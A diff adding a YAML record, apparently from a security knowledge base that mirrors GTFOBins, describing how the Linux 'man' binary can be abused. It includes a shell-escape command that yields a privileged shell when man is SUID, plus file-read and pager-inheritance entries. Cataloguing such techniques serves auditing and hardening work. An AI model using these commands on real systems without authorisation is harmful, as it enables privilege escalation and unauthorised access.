@@ -1,0 +1,95 @@
+id: gtfobins/man/shell/suid
+type: binary
+platform: linux
+name: man
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'man ''-H/bin/sh #'' man'
+  comment: This requires GNU `troff` (`groff`) to be installed.
+references:
+- https://gtfobins.github.io/gtfobins/man/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        man:
+          functions:
+            file-read:
+            - code: man /path/to/input-file
+              comment: The file is shown somehow formatted and displayed in the default pager.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            inherit:
+            - code: man man
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              from: less
+            shell:
+            - code: 'man ''-H/bin/sh #'' man'
+              comment: This requires GNU `troff` (`groff`) to be installed.
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+              version: GNU
+    upstream_url: https://gtfobins.github.io/gtfobins/man/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:68e32733665338e0214b90cb6bcae7743102ff965764a924cc8bcd512427fd42
